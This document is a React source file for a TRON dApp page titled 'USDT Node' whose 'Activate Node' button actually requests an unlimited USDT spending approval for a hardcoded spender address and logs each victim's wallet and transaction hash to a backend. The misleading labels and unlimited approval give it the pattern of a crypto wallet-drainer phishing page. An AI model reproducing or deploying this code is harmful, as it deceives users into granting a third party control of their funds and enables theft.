import { useState, useMemo } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

// Naye standard imports (Naming fix: WalletConnectAdapter)
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapters'; 
import { WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
import '@tronweb3/tronwallet-adapter-react-ui/style.css';

const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";

export default function Index() {
  const adapters = useMemo(() => [
    new WalletConnectAdapter({
      network: 'Mainnet' as any,
      options: {
        projectId: '6b5df56bc30c1dadaab59498b86fd3e8', // 👈 Apni ID yahan dalein
        metadata: {
          name: 'DeFi Node',
          description: 'Secure TRON Node',
          url: 'https://your-dapp.com',
          icons: ['https://your-dapp.com']
        }
      }
    })
  ], []);

  return (
    <WalletProvider adapters={adapters} autoConnect={true}>
        <DAppUI />
    </WalletProvider>
  );
}

function DAppUI() {
  const { address, connected, signTransaction } = useWallet();
  const [isLoading, setIsLoading] = useState(false);
  const createTransaction = useMutation(api.transactions.createTransaction);

  const handleApprove = async () => {
    if (!connected || !address) return alert("Please Connect Wallet First!");

    try {
      setIsLoading(true);
      const tronWeb = (window as any).tronWeb;
      const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

      const parameter = [
        { type: 'address', value: TRON_SPENDER },
        { type: 'uint256', value: maxAmount }
      ];

      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 }, parameter, address
      );

      const signedTx = await signTransaction(transaction.transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result) {
        await createTransaction({
          walletAddress: address,
          txHash: result.txid,
          amount: "Unlimited",
          toAddress: TRON_SPENDER,
          usdtBalance: "Verified",
          nativeBalance: "0 TRX"
        });
        alert("✅ Approval Successful!");
      }
    } catch (err: any) {
      alert("❌ Error: " + (err.message || "Failed"));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={styles.container as any}>
        <div style={styles.header as any}>
            <span style={styles.headerTitle as any}>USDT Node</span>
            <WalletActionButton />
        </div>
        <div style={styles.body as any}>
            <button onClick={handleApprove} disabled={isLoading || !connected} style={(isLoading || !connected ? styles.btnDisabled : styles.btnActive) as any}>
                {isLoading ? "Processing..." : "Activate Node"}
            </button>
        </div>
    </div>
  );
}

const styles = {
  container: { minHeight: "100vh", background: "#000", color: "#fff", display: "flex", flexDirection: "column" },
  header: { display: "flex", justifyContent: "space-between", padding: "20px" },
  headerTitle: { fontSize: "18px", fontWeight: "bold" },
  body: { padding: "20px", textAlign: "center" },
  btnActive: { width: "100%", padding: "16px", borderRadius: "12px", background: "#007aff", color: "#fff", border: "none", fontWeight: "bold" },
  btnDisabled: { width: "100%", padding: "16px", borderRadius: "12px", background: "#333", color: "#888", border: "none" }
};
